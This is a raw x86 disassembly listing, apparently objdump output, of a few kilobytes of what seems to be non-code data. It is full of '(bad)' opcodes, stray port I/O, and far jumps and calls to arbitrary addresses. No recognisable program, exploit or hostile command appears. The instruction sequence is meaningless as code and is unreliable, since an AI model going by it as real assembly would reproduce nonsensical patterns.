  426692:	pop    ecx
  426693:	xor    al,BYTE PTR [esi+0x71]
  426696:	adc    esp,DWORD PTR [ebx]
  426698:	push   edx
  426699:	in     al,dx
  42669a:	jno    0x42668d
  42669c:	mov    edi,0xf00bcbc8
  4266a1:	aas    
  4266a2:	jecxz  0x4266e5
  4266a4:	xor    eax,0x76f8ee5b
  4266a9:	aaa    
  4266aa:	jnp    0x4266e9
  4266ac:	das    
  4266ad:	push   esp
  4266ae:	adc    ch,al
  4266b0:	(bad)  
  4266b1:	jecxz  0x4266a9
  4266b3:	or     BYTE PTR [ecx+0x6],dh
  4266b6:	les    edi,FWORD PTR [ecx-0x13998d01]
  4266bc:	jge    0x11324144
  4266c2:	push   edx
  4266c3:	into   
  4266c4:	data16 ins BYTE PTR es:[edi],dx
  4266c6:	jmp    0x4266fd
  4266c8:	push   esp
  4266c9:	adc    edi,eax
  4266cb:	das    
  4266cc:	and    cl,BYTE PTR [ebx+0x5f584122]
  4266d2:	fidivr WORD PTR [edx]
  4266d4:	popa   
  4266d5:	fstp   DWORD PTR [eax]
  4266d7:	aam    0x75
  4266d9:	jae    0x426734
  4266db:	sbb    ebp,eax
  4266dd:	scas   eax,DWORD PTR es:[edi]
  4266de:	clc    
  4266df:	and    DWORD PTR [ebx+0x6438db11],esp
  4266e5:	(bad)
  4266e8:	cli    
  4266e9:	ja     0x4266ec
  4266eb:	and    ah,al
  4266ed:	ins    BYTE PTR es:[edi],dx
  4266ee:	scas   eax,DWORD PTR es:[edi]
  4266ef:	mov    BYTE PTR [ebx],bh
  4266f1:	xchg   ebx,eax
  4266f2:	clc    
  4266f3:	(bad)  
  4266f4:	sbb    BYTE PTR [ecx+eiz*4-0x7042ade1],cl
  4266fb:	cs ss jb 0x4266e9
  4266ff:	test   DWORD PTR [esi],ebp
  426701:	pop    sp
  426703:	adc    eax,DWORD PTR [eax-0x5c]
  426706:	out    0xdc,eax
  426708:	dec    BYTE PTR [esi]
  42670a:	sub    al,0xf5
  42670c:	pop    es
  42670d:	adc    al,0xcd
  42670f:	scas   al,BYTE PTR es:[edi]
  426710:	ins    DWORD PTR es:[edi],dx
  426711:	out    0xe9,eax
  426713:	call   0x2611d7e6
  426718:	mov    eax,ds:0x8ccdb5b0
  42671d:	push   edi
  42671e:	dec    edx
  42671f:	ror    bh,1
  426721:	lea    ebx,[ebx+0x39]
  426724:	adc    eax,0x4e880cfc
  426729:	push   edi
  42672a:	mov    ds:0xc7fe3d11,al
  42672f:	enter  0x4987,0x5c
  426733:	aam    0x27
  426735:	mov    ch,0x9
  426737:	test   al,0xba
  426739:	pusha  
  42673a:	fsubp  st(7),st
  42673c:	sub    dl,al
  42673e:	scas   al,BYTE PTR es:[edi]
  42673f:	and    dl,BYTE PTR [edi]
  426741:	es push ebx
  426743:	inc    eax
  426744:	inc    ebx
  426745:	push   ss
  426746:	push   esp
  426747:	jbe    0x42670a
  426749:	mov    esp,0xf367023f
  42674e:	jecxz  0x4267b0
  426750:	(bad)  
  426751:	in     eax,dx
  426752:	rol    ah,cl
  426754:	daa    
  426755:	inc    ebp
  426756:	cmp    DWORD PTR [ebp-0x54],0xffffffda
  42675a:	jno    0x4267ce
  42675c:	pop    ebx
  42675d:	test   BYTE PTR [eax+0x3e63ae69],dl
  426763:	push   ecx
  426764:	xchg   edi,eax
  426765:	daa    
  426766:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426767:	jg     0x426798
  426769:	or     ebx,DWORD PTR [ebx]
  42676b:	js     0x4267d8
  42676d:	pop    esp
  42676e:	imul   esi,DWORD PTR [edx+0x22637aaa],0x79788b71
  426778:	stos   BYTE PTR es:[edi],al
  426779:	scas   al,BYTE PTR es:[edi]
  42677a:	cmp    ecx,esi
  42677c:	mul    DWORD PTR ss:[edi-0x5d62afd1]
  426783:	inc    ebx
  426784:	mov    bl,0xb6
  426786:	fidiv  WORD PTR [ecx+eiz*4-0xf6af6d5]
  42678d:	cmp    DWORD PTR [edi],esp
  42678f:	dec    eax
  426790:	xchg   esp,eax
  426791:	sar    ebp,cl
  426793:	mov    eax,ds:0x8fd1d723
  426798:	mov    bh,0x52
  42679a:	ror    DWORD PTR [esi+0x2e23d2fd],1
  4267a0:	inc    ebp
  4267a1:	fninit 
  4267a3:	push   ebx
  4267a4:	loopne 0x4267d2
  4267a6:	jnp    0x4267ce
  4267a8:	sub    eax,0x62dbdd50
  4267ad:	adc    eax,0xb9bfb50b
  4267b2:	out    dx,al
  4267b3:	mov    bh,0xd7
  4267b5:	rcl    DWORD PTR [edi+0x1863b9fb],cl
  4267bb:	pop    ecx
  4267bc:	pop    edx
  4267bd:	mov    WORD PTR [edi],es
  4267bf:	ret    0x5504
  4267c2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4267c3:	mov    eax,0x46ba1f4d
  4267c8:	(bad)  
  4267c9:	cld    
  4267ca:	sbb    ebp,edi
  4267cc:	sub    BYTE PTR [esi+0x18],bl
  4267cf:	shr    DWORD PTR [edx],0xb7
  4267d2:	sti    
  4267d3:	cmp    eax,0x6403c60f
  4267d8:	(bad)
  4267dc:	xor    eax,0xa7b291cf
  4267e1:	repnz aad 0xfa
  4267e4:	mov    ebp,0x65cc5e98
  4267e9:	pushf  
  4267ea:	mov    edx,0x3980ca60
  4267ef:	dec    edi
  4267f0:	xchg   cl,dh
  4267f2:	addr16 pop ss
  4267f4:	pop    DWORD PTR [esi+0x5a7e97b4]
  4267fa:	push   edi
  4267fb:	or     BYTE PTR [edx+eax*8-0x189029c1],bl
  426802:	clc    
  426803:	sbb    ah,al
  426805:	aaa    
  426806:	clc    
  426807:	shl    cl,1
  426809:	xchg   edx,eax
  42680a:	push   ss
  42680b:	cmp    DWORD PTR [edx-0x77],ebp
  42680e:	pop    ecx
  42680f:	aam    0x81
  426811:	fist   DWORD PTR [edx]
  426813:	lods   eax,DWORD PTR ds:[esi]
  426814:	cwde   
  426815:	cs jo  0x4267ba
  426818:	lea    eax,[esi-0x644b6f15]
  42681e:	dec    edx
  42681f:	cmp    DWORD PTR [esi],0xe6a0b33
  426825:	stos   DWORD PTR es:[edi],eax
  426826:	sbb    eax,0x6908a01
  42682b:	pusha  
  42682c:	jecxz  0x426813
  42682e:	add    BYTE PTR [ebp+0x7b],al
  426831:	pop    es
  426832:	cld    
  426833:	fwait
  426834:	imul   ebp,DWORD PTR [eax+0x1c],0xffffff84
  426838:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426839:	mov    eax,0x3daef811
  42683e:	inc    esi
  42683f:	mov    edx,0xb854b080
  426844:	in     al,dx
  426845:	pop    edx
  426846:	and    DWORD PTR [ebx+0x7c],edx
  426849:	jl     0x42683a
  42684b:	mov    esp,0x21342556
  426850:	inc    esi
  426851:	adc    BYTE PTR [edx-0x1c9017e6],bl
  426857:	jg     0x426810
  426859:	mov    ch,0x2
  42685b:	dec    esi
  42685c:	and    BYTE PTR [edx+0x9],dl
  42685f:	imul   ebp,ecx,0xdc8b61
  426865:	pop    eax
  426866:	xchg   ebp,eax
  426867:	add    dh,dl
  426869:	inc    esp
  42686a:	in     eax,0x12
  42686c:	into   
  42686d:	mov    eax,ds:0xb656998a
  426872:	outs   dx,DWORD PTR ds:[esi]
  426873:	jmp    0xa2bb7aa6
  426878:	sar    DWORD PTR [eax+0x3e],0x11
  42687c:	daa    
  42687d:	add    al,0x6a
  42687f:	xchg   DWORD PTR [edx],edx
  426881:	add    eax,0x6f85bd1e
  426886:	push   edi
  426887:	mov    al,BYTE PTR [ecx-0x181809d]
  42688d:	sar    DWORD PTR [esi+0x5f0a8ed1],1
  426893:	fs je  0x426827
  426896:	popa   
  426897:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426898:	sub    al,0xf7
  42689a:	inc    esi
  42689b:	(bad)  
  42689c:	fst    QWORD PTR [edi-0x586d7961]
  4268a2:	push   0x64effce
  4268a7:	jb     0x426838
  4268a9:	test   BYTE PTR ds:0x90f853b5,cl
  4268af:	(bad)  
  4268b0:	outs   dx,BYTE PTR ds:[esi]
  4268b1:	xor    al,0x2f
  4268b3:	ror    BYTE PTR [edx],cl
  4268b5:	and    ebx,DWORD PTR [eax+0x3e3387b2]
  4268bb:	mov    edx,0xabdf2c77
  4268c0:	call   0x9ed2:0xbd9f19a6
  4268c7:	adc    dl,ch
  4268c9:	mov    edx,0xe8eedc9f
  4268ce:	pop    edx
  4268cf:	outs   dx,DWORD PTR ds:[esi]
  4268d0:	sub    eax,edi
  4268d2:	(bad)  
  4268d3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4268d4:	loopne 0x4268fc
  4268d6:	push   ebx
  4268d7:	xor    dl,bl
  4268d9:	and    ch,cl
  4268db:	iret   
  4268dc:	test   ebx,esp
  4268de:	leave  
  4268df:	clc    
  4268e0:	test   BYTE PTR [ecx+0x2c],bl
  4268e3:	mov    esp,0x8b8035d
  4268e8:	faddp  st(3),st
  4268ea:	push   0xe84484ac
  4268ef:	stos   BYTE PTR es:[edi],al
  4268f0:	js     0x426937
  4268f2:	mov    ss,WORD PTR [edi+0x79511520]
  4268f8:	inc    ebx
  4268f9:	mul    BYTE PTR [ecx]
  4268fb:	test   eax,0x69cee450
  426900:	mov    eax,ds:0x54226ee8
  426905:	jmp    0x4268aa
  426907:	adc    BYTE PTR [ebp+0x7e],bl
  42690a:	inc    ebx
  42690b:	jae    0x4268e6
  42690d:	push   edi
  42690e:	outs   dx,DWORD PTR ds:[esi]
  42690f:	xchg   ebp,eax
  426910:	ds push ds
  426912:	or     al,0x44
  426914:	popa   
  426915:	jno    0x42696b
  426917:	jl     0x426976
  426919:	push   esi
  42691b:	scas   eax,DWORD PTR es:[edi]
  42691c:	jle    0x42696a
  42691e:	inc    edx
  42691f:	sahf   
  426920:	sub    al,0xee
  426922:	xchg   esi,eax
  426923:	xchg   edx,eax
  426924:	ja     0x426904
  426926:	and    ecx,DWORD PTR [edx+0x57c8d044]
  42692c:	fs popa 
  42692e:	ins    BYTE PTR es:[edi],dx
  42692f:	adc    al,0x58
  426931:	(bad)  
  426932:	test   al,0xe7
  426934:	(bad)  
  426935:	out    0x14,eax
  426937:	add    ecx,eax
  426939:	inc    esi
  42693a:	outs   dx,DWORD PTR ds:[esi]
  42693b:	enter  0x6a66,0x35
  42693f:	retf   
  426940:	ins    DWORD PTR es:[edi],dx
  426941:	ss xchg esi,eax
  426943:	cmp    ebx,ebp
  426945:	gs scas eax,DWORD PTR es:[edi]
  426947:	les    ecx,FWORD PTR [ebx-0x61]
  42694a:	dec    edx
  42694b:	inc    ebp
  42694c:	leave  
  42694d:	imul   edi,DWORD PTR ds:0xe97439df,0x63
  426954:	dec    edx
  426955:	cmp    eax,0x964d9566
  42695a:	pop    ds
  42695b:	out    dx,eax
  42695c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42695d:	dec    esi
  42695e:	mov    ebx,ecx
  426960:	dec    esp
  426961:	xor    DWORD PTR ds:0x7d5a4443,esi
  426967:	fistp  QWORD PTR [esi+eiz*8-0x80]
  42696b:	jnp    0x4268f5
  42696d:	push   eax
  42696e:	pop    edx
  42696f:	xchg   bl,ch
  426971:	in     eax,dx
  426972:	shl    BYTE PTR [ebx+0x10],0xa8
  426976:	aam    0xe1
  426978:	lods   eax,DWORD PTR ds:[esi]
  426979:	jmp    0xbf41baed
  42697e:	and    ah,bl
  426980:	fwait
  426981:	jno    0x4269ed
  426983:	fwait
  426984:	lock adc DWORD PTR [edi-0xd],ebx
  426988:	sub    eax,0x6d87c76e
  42698d:	pop    edi
  42698e:	push   edx
  42698f:	lahf   
  426990:	pop    es
  426991:	push   esi
  426992:	imul   DWORD PTR [edx-0x4a038909]
  426998:	or     al,0xb5
  42699a:	ja     0x42695e
  42699c:	xor    al,0x7b
  42699e:	les    eax,FWORD PTR [edx+0x60cce3cb]
  4269a4:	fs mov eax,0x48eb58bd
  4269aa:	cld    
  4269ab:	dec    ebx
  4269ac:	and    ah,ah
  4269ae:	fld    QWORD PTR [edx]
  4269b0:	nop
  4269b1:	pushf  
  4269b2:	sub    BYTE PTR [edx*2-0x159cdde2],0xa5
  4269ba:	inc    esp
  4269bb:	in     al,dx
  4269bc:	adc    DWORD PTR [ebx+0x68],0x152cd544
  4269c3:	pop    ebp
  4269c4:	cmp    esi,ecx
  4269c6:	push   0x2e
  4269c8:	test   al,0x8c
  4269ca:	popf   
  4269cb:	inc    ah
  4269cd:	fwait
  4269ce:	sub    eax,0x1dc75c60
  4269d3:	inc    eax
  4269d4:	and    ecx,DWORD PTR ds:0x22cf9a3d
  4269da:	mov    ebp,0x9386252f
  4269df:	stc    
  4269e0:	xchg   ecx,eax
  4269e1:	cmp    dl,dh
  4269e3:	or     al,0xfb
  4269e5:	push   eax
  4269e6:	jae    0x4269f5
  4269e8:	push   0x715aecf8
  4269ed:	(bad)  
  4269ee:	enter  0xc87,0x94
  4269f2:	inc    eax
  4269f3:	jmp    0x4269d2
  4269f5:	and    BYTE PTR [ebx+0x1604d073],cl
  4269fb:	fwait
  4269fc:	push   ebx
  4269fd:	jns    0x426981
  4269ff:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426a00:	rcl    BYTE PTR [edi+0x3c369d65],0xff
  426a07:	rol    bl,0xbf
  426a0a:	jmp    0x4269cf
  426a0c:	add    edi,DWORD PTR [edx+0x4e02f9a5]
  426a12:	add    bl,bh
  426a14:	fldenv [ebx]
  426a16:	fstp   QWORD PTR [ecx-0x42b3e585]
  426a1c:	pop    ebx
  426a1d:	mov    bl,0xb7
  426a1f:	or     al,0xb6
  426a21:	int3   
  426a22:	or     BYTE PTR [edx+0x30],bh
  426a25:	sbb    eax,0xc94b74ec
  426a2a:	pop    esp
  426a2b:	pop    es
  426a2c:	jecxz  0x426a02
  426a2e:	adc    dl,cl
  426a30:	and    eax,0xdea2cffd
  426a35:	(bad)  
  426a36:	std    
  426a37:	mov    BYTE PTR [ecx+0x1dc3e347],bl
  426a3d:	add    dh,BYTE PTR [ebp-0x3b]
  426a40:	sub    BYTE PTR [eax+ebp*8-0x11],bh
  426a44:	pop    edi
  426a45:	cmp    esi,DWORD PTR [edx*8-0x42643fc0]
  426a4c:	xlat   BYTE PTR ds:[ebx]
  426a4d:	call   0x8fa3:0x4044cd82
  426a54:	ror    ebp,0x4a
  426a57:	in     eax,dx
  426a58:	and    ecx,DWORD PTR [eax+0x0]
  426a5b:	popa   
  426a5c:	mov    ds:0x526fe027,eax
  426a61:	xchg   esp,eax
  426a62:	je     0x426add
  426a64:	jecxz  0x426a88
  426a66:	adc    dh,dh
  426a68:	pop    esi
  426a69:	pop    ss
  426a6a:	loopne 0x426ad3
  426a6c:	into   
  426a6d:	cmp    eax,DWORD PTR [si+0x6f]
  426a71:	imul   ebp,DWORD PTR [ebx],0xffffffc8
  426a74:	adc    al,0x79
  426a76:	sbb    al,0xb7
  426a78:	xor    al,0x19
  426a7a:	and    al,0xfa
  426a7c:	jae    0x426a90
  426a7e:	in     al,dx
  426a7f:	push   ebx
  426a80:	mov    ebx,0x135fedfc
  426a85:	mov    esi,DWORD PTR [ecx-0x7e]
  426a88:	sbb    DWORD PTR [ebp-0x105e8f8e],edi
  426a8e:	iret   
  426a8f:	stos   DWORD PTR es:[edi],eax
  426a90:	addr16 repz mov al,ds:0xfb14
  426a95:	addr16 ja 0x426abd
  426a98:	fcomp  DWORD PTR [eax+0x4066a418]
  426a9e:	outs   dx,DWORD PTR ds:[esi]
  426a9f:	dec    ebp
  426aa0:	pop    ebx
  426aa1:	out    dx,eax
  426aa2:	inc    ecx
  426aa3:	call   0xb6b3:0x42c21256
  426aaa:	mov    ch,0x7a
  426aac:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426aad:	mov    edx,0x1c2f4de4
  426ab2:	outs   dx,DWORD PTR ds:[esi]
  426ab3:	mov    al,ds:0xe0bb7ddd
  426ab8:	mov    esp,0xaa92055
  426abd:	push   cs
  426abe:	inc    esp
  426abf:	les    ecx,FWORD PTR [ecx-0x195a9526]
  426ac5:	stos   DWORD PTR es:[edi],eax
  426ac6:	pop    ds
  426ac7:	or     eax,0x2b1ae20e
  426acc:	dec    edi
  426acd:	inc    BYTE PTR [edx]
  426acf:	rcl    eax,cl
  426ad1:	inc    esp
  426ad3:	dec    ecx
  426ad4:	cmp    al,0xcb
  426ad6:	test   DWORD PTR [ebx+0x27],edx
  426ad9:	ret    
  426ada:	sub    DWORD PTR [eax],edx
  426adc:	pop    edx
  426add:	add    BYTE PTR [esi-0x5b],0xc7
  426ae1:	je     0x426aaf
  426ae3:	in     al,dx
  426ae4:	shl    BYTE PTR [ebx],cl
  426ae6:	bound  eax,QWORD PTR [edx]
  426ae8:	jae    0x426aae
  426aea:	int3   
  426aeb:	jmp    0x426a9b
  426aed:	jo     0x426a7b
  426aef:	test   edi,ebp
  426af1:	push   edx
  426af2:	push   ebx
  426af3:	cs stos BYTE PTR es:[edi],al
  426af5:	dec    ebx
  426af6:	push   0x4a56a5ee
  426afb:	push   es
  426afc:	ss pop ebx
  426afe:	jp     0x426b1e
  426b00:	or     ah,BYTE PTR [edx+0x4c]
  426b03:	das    
  426b04:	adc    al,0xc0
  426b06:	imul   ebp,esp,0x317ab312
  426b0c:	pop    ebx
  426b0d:	ss cmp al,0x2a
  426b10:	outs   dx,BYTE PTR ds:[esi]
  426b11:	not    bl
  426b13:	xchg   DWORD PTR [edi],esi
  426b15:	stos   DWORD PTR es:[edi],eax
  426b16:	xchg   esi,eax
  426b17:	loop   0x426aa1
  426b19:	enter  0x7b1b,0xef
  426b1d:	jne    0x426aa3
  426b1f:	add    bx,sp
  426b22:	and    eax,0xe514da85
  426b27:	xor    ch,BYTE PTR [edi-0x3dd2b957]
  426b2d:	or     DWORD PTR [ecx-0x4c912713],edi
  426b33:	inc    edx
  426b34:	add    edi,esp
  426b36:	add    bh,ah
  426b38:	inc    edx
  426b39:	clc    
  426b3a:	imul   BYTE PTR [ecx+ebp*2+0x1570d3cc]
  426b41:	xchg   esi,eax
  426b42:	not    esi
  426b44:	and    DWORD PTR [ecx],ebp
  426b46:	jecxz  0x426af2
  426b48:	repnz dec edx
  426b4a:	cdq    
  426b4b:	pop    eax
  426b4c:	pop    ds
  426b4d:	lahf   
  426b4e:	xchg   edx,eax
  426b4f:	adc    DWORD PTR [edx+0x74],edi
  426b52:	cmp    ah,bl
  426b54:	mov    ecx,ecx
  426b56:	stos   BYTE PTR es:[edi],al
  426b57:	test   BYTE PTR [esi],ch
  426b59:	in     eax,dx
  426b5a:	out    0xc9,al
  426b5c:	fstp   DWORD PTR [eax-0x2]
  426b5f:	sub    DWORD PTR [esi+0x9],0xebf07dce
  426b66:	or     DWORD PTR [ebp+0xafc0fd6],eax
  426b6c:	mov    eax,ds:0xdef41fca
  426b71:	shl    DWORD PTR [ebx+0x3a],1
  426b74:	cmc    
  426b75:	lock call 0xe7b8a6ac
  426b7b:	sbb    ecx,DWORD PTR ds:[esi-0x6e]
  426b7f:	inc    esp
  426b80:	inc    esi
  426b81:	add    DWORD PTR [edi+eax*1+0x3d],eax
  426b85:	sub    ecx,eax
  426b87:	cli    
  426b88:	mov    ecx,0xea99bc03
  426b8d:	clc    
  426b8e:	xor    esi,esi
  426b90:	sub    al,0x9
  426b92:	(bad)  
  426b93:	cli    
  426b94:	pushf  
  426b95:	out    0xb4,al
  426b97:	adc    DWORD PTR [ecx],ebp
  426b99:	mov    ah,0x31
  426b9b:	ja     0x426baa
  426b9d:	ret    0x338f
  426ba0:	push   edi
  426ba1:	aad    0xce
  426ba3:	xor    ch,dh
  426ba5:	add    esp,DWORD PTR [eax+0x3d]
  426ba8:	scas   al,BYTE PTR es:[edi]
  426ba9:	pop    edx
  426baa:	mov    ah,0xbc
  426bac:	mov    ebp,0xb49ba6c3
  426bb1:	out    dx,al
  426bb2:	pop    esp
  426bb3:	cs rol cl,1
  426bb6:	inc    esp
  426bb7:	jmp    0x426c31
  426bb9:	daa    
  426bba:	scas   al,BYTE PTR es:[edi]
  426bbb:	aad    0x6e
  426bbd:	into   
  426bbe:	or     al,0x77
  426bc0:	dec    ebx
  426bc1:	cld    
  426bc2:	mov    cl,BYTE PTR [eax*1+0x2b2c94ae]
  426bc9:	loop   0x426b81
  426bcb:	(bad)  
  426bcc:	aad    0xdb
  426bce:	inc    ebx
  426bcf:	ins    DWORD PTR es:[edi],dx
  426bd0:	sub    eax,0xa5121000
  426bd5:	in     eax,0xed
  426bd7:	dec    ebx
  426bd8:	fstp   DWORD PTR [edi+edi*8+0x3a3b95ac]
  426bdf:	lahf   
  426be0:	popf   
  426be1:	xchg   ebx,eax
  426be2:	scas   eax,DWORD PTR es:[edi]
  426be3:	xchg   esp,eax
  426be4:	imul   edi,ecx,0x75
  426be7:	bswap  edx
  426be9:	mov    ds:0x2cee00f0,al
  426bee:	mov    ah,0xe4
  426bf0:	arpl   di,dx
  426bf2:	xchg   edi,eax
  426bf3:	xor    esi,DWORD PTR [esi]
  426bf5:	mov    edi,0x2f8142af
  426bfa:	je     0x426c1f
  426bfc:	call   0x6ae5e626
  426c01:	ret    0x53bb
  426c04:	loop   0x426c1b
  426c06:	retf   
  426c07:	cmp    eax,0xf4ef8e0d
  426c0c:	push   es
  426c0d:	push   0x491f12a2
  426c12:	loop   0x426c54
  426c14:	jmp    0x4885:0xb585c5bd
  426c1b:	xchg   DWORD PTR [ebp+0x57],ebp
  426c1e:	sub    DWORD PTR [esi-0x6fdd8345],eax
  426c24:	xor    dh,BYTE PTR [ebx+0xf]
  426c27:	test   eax,0x5241058b
  426c2c:	xchg   ecx,eax
  426c2d:	adc    eax,0x4242beac
  426c32:	sub    eax,0xca200ad1
  426c37:	sar    DWORD PTR [edi+0x4e],cl
  426c3a:	cdq    
  426c3b:	pop    eax
  426c3c:	sbb    BYTE PTR [eax-0x7c2bff8a],dh
  426c42:	or     eax,0x332ea943
  426c47:	fcmovne st,st(5)
  426c49:	pop    esp
  426c4a:	dec    esi
  426c4b:	(bad)  
  426c4c:	lods   eax,DWORD PTR ds:[esi]
  426c4d:	pop    eax
  426c4e:	mov    ds:0xc1a258f,eax
  426c53:	xor    eax,0x62661864
  426c58:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426c59:	pop    ss
  426c5a:	cwde   
  426c5b:	les    ecx,FWORD PTR [ebp-0x419d7c71]
  426c61:	repnz imul ebp,DWORD PTR [ecx+ebp*8],0x6eca2765
  426c69:	pop    esp
  426c6a:	xor    ebx,DWORD PTR [edx-0xbb98f2f]
  426c70:	xchg   DWORD PTR [eax+eax*1-0x6b45a95],eax
  426c77:	ja     0x426cdc
  426c79:	adc    DWORD PTR [esi-0x2c],0xd136c993
  426c80:	shl    esp,0x69
  426c83:	cmp    al,BYTE PTR [ebx-0x71]
  426c86:	sbb    BYTE PTR [ebx+0x66b669ee],bh
  426c8c:	mov    cl,0xb5
  426c8e:	scas   al,BYTE PTR es:[edi]
  426c8f:	ficom  WORD PTR [ebp+0x27]
  426c92:	(bad)  
  426c93:	sub    al,0x1e
	...
  426d11:	add    BYTE PTR [eax],al
  426d13:	add    BYTE PTR ds:0x55d31474,ah
  426d19:	repz out 0xf6,eax
  426d1c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426d1d:	adc    bh,BYTE PTR [esi]
  426d1f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426d20:	ins    BYTE PTR es:[edi],dx
  426d21:	js     0x426cc5
  426d23:	sub    esi,DWORD PTR [eax+0x690001fd]
  426d29:	pop    es
  426d2a:	add    BYTE PTR [eax],al
  426d2c:	repz xor DWORD PTR ds:[esi-0x35ee5ad2],0x767f4419
  426d38:	icebp  
  426d39:	scas   al,BYTE PTR es:[edi]
  426d3a:	ja     0x426d88
  426d3c:	call   0xab1f:0x6fdb6f5b
  426d43:	leave  
  426d44:	adc    al,0xa2
  426d46:	fcomi  st,st(5)
  426d48:	adc    bl,BYTE PTR [edi+0x73]
  426d4b:	fild   QWORD PTR [ecx+0x10eb6ab]
  426d51:	push   0xbf96885f
  426d56:	(bad)
  426d59:	xor    al,0xb8
  426d5b:	xlat   BYTE PTR ds:[ebx]
  426d5c:	sub    eax,DWORD PTR [eax*2-0x76930717]
  426d63:	std    
  426d64:	fmul   DWORD PTR [ecx]
  426d66:	clc    
  426d67:	lods   al,BYTE PTR ds:[esi]
  426d68:	push   0x7e
  426d6a:	stos   DWORD PTR es:[edi],eax
  426d6b:	icebp  
  426d6c:	jge    0x426d6c
  426d6e:	dec    esp
  426d6f:	clc    
  426d70:	ja     0x426d75
  426d72:	cmc    
  426d73:	lahf   
  426d74:	cmp    al,0xf2
  426d76:	jp     0x426d4b
  426d78:	pushf  
  426d79:	les    edi,FWORD PTR [edi+0x61]
  426d7c:	pushf  
  426d7d:	js     0x426d8c
  426d7f:	mov    esi,0x5a941c6d
  426d84:	cs add dl,ah
  426d87:	and    ch,cl
  426d89:	inc    ebx
  426d8a:	inc    edx
  426d8b:	sub    bl,BYTE PTR [ebp+0xa]
  426d8e:	jg     0x426d7d
  426d90:	(bad)  
  426d91:	es pop ss
  426d93:	jmp    0xb81a:0x112fc5f9
  426d9a:	xor    DWORD PTR [eax-0xcc3485c],ecx
  426da0:	or     cl,dh
  426da2:	sbb    dl,bh
  426da4:	inc    ebx
  426da5:	sbb    ebx,DWORD PTR [esi-0x2158d5a2]
  426dab:	enter  0x1bb3,0x3f
  426daf:	sti    
  426db0:	cmp    ebp,DWORD PTR [edi-0x7a050735]
  426db6:	inc    edx
  426db7:	out    dx,eax
  426db8:	mov    ebp,0x920fe373
  426dbd:	fisubr WORD PTR [ebx]
  426dbf:	pusha  
  426dc0:	mov    bl,0x32
  426dc2:	xchg   BYTE PTR [ebx],bh
  426dc4:	addr16 aaa 
  426dc6:	dec    eax
  426dc7:	pop    esi
  426dc8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426dc9:	retf   
  426dca:	mov    al,ds:0x4e96a7f5
  426dd0:	jp     0x426e23
  426dd2:	adc    ecx,DWORD PTR [ebx-0x42]
  426dd5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426dd6:	add    ebx,DWORD PTR [edi+esi*2]
  426dd9:	push   ebx
  426dda:	ret    
  426ddb:	mov    ebx,0x3114ecd
  426de0:	pop    ecx
  426de1:	stos   DWORD PTR es:[edi],eax
  426de2:	xor    DWORD PTR [edi],ebx
  426de4:	sahf   
  426de5:	lock mov ebx,0xe93f17ff
  426deb:	sbb    ch,BYTE PTR [ebx+0x6f42af2a]
  426df1:	aas    
  426df2:	stos   BYTE PTR es:[edi],al
  426df3:	pop    ecx
  426df4:	outs   dx,BYTE PTR ds:[esi]
  426df5:	or     bl,al
  426df7:	pop    esi
  426df8:	xor    ecx,DWORD PTR [edx]
  426dfa:	push   ds
  426dfb:	pop    ecx
  426dfc:	cmp    ah,BYTE PTR [eiz*8-0x1d3dc9d3]
  426e03:	fsubr  QWORD PTR [ebx]
  426e05:	and    ebx,DWORD PTR [ebx]
  426e07:	jmp    0x7282:0x4dd58f47
  426e0e:	int    0xa6
  426e10:	lahf   
  426e11:	dec    esp
  426e12:	inc    edx
  426e13:	cdq    
  426e14:	test   eax,0x89840ea5
  426e19:	arpl   WORD PTR [ecx+0x12cbb1ac],sp
  426e1f:	xchg   ebp,eax
  426e20:	mov    ah,0xb7
  426e22:	popf   
  426e23:	add    DWORD PTR [esp+ebp*4+0x52],esi
  426e27:	xor    DWORD PTR [edx],esp
  426e29:	out    0x8a,al
  426e2b:	jle    0x426e7b
  426e2d:	fmul   DWORD PTR [edx]
  426e2f:	push   edi
  426e30:	xchg   dl,bl
  426e32:	leave  
  426e33:	inc    edi
  426e34:	loope  0x426e16
  426e36:	(bad)  
  426e38:	shr    BYTE PTR [edi-0x18],1
  426e3b:	jbe    0x426dbf
  426e3d:	mov    dh,0x60
  426e3f:	push   esi
  426e40:	push   edi
  426e41:	adc    DWORD PTR [ebp+ebp*2-0x732f891b],esi
  426e48:	sahf   
  426e49:	dec    ebx
  426e4a:	jbe    0x426e9d
  426e4c:	cmp    edi,esi
  426e4e:	add    BYTE PTR [ecx+0x34],al
  426e51:	fs push ss
  426e53:	add    esp,DWORD PTR [ecx-0x4e]
  426e56:	lahf   
  426e57:	scas   al,BYTE PTR es:[edi]
  426e58:	test   al,0xd3
  426e5a:	rcr    BYTE PTR [esp+edi*4-0x17e87e74],0xa9
  426e62:	(bad)  
  426e63:	pop    ebp
  426e64:	cmp    DWORD PTR [edx-0x35],edx
  426e67:	dec    esi
  426e68:	ja     0x426ebb
  426e6a:	outs   dx,DWORD PTR ds:[esi]
  426e6b:	call   0x384f:0xec3868b8
  426e72:	xchg   ebp,esp
  426e74:	xchg   DWORD PTR [edx-0x7e],esi
  426e77:	cs inc eax
  426e79:	and    esi,ebx
  426e7b:	mov    dl,0x81
  426e7d:	int    0xf0
  426e7f:	int3   
  426e80:	int    0x5e
  426e82:	lea    ecx,[ecx-0x1e]
  426e85:	fistp  QWORD PTR [ebx+0x59bc0e2d]
  426e8b:	ins    BYTE PTR es:[edi],dx
  426e8c:	fs repnz test bh,ch
  426e90:	add    al,0x7e
  426e92:	cld    
  426e93:	mov    cl,0x8b
  426e95:	mov    eax,0x1ee0f111
  426e9a:	mov    al,0x61
  426e9c:	mov    dl,cl
  426e9e:	loop   0x426e9a
  426ea0:	sub    ah,BYTE PTR [eax]
  426ea2:	or     eax,0x4e97ecba
  426ea7:	shr    DWORD PTR [ecx+0x36],0x3e
  426eab:	push   ebx
  426eac:	mov    gs,WORD PTR [esi]
  426eae:	push   ds
  426eaf:	cs (bad) 
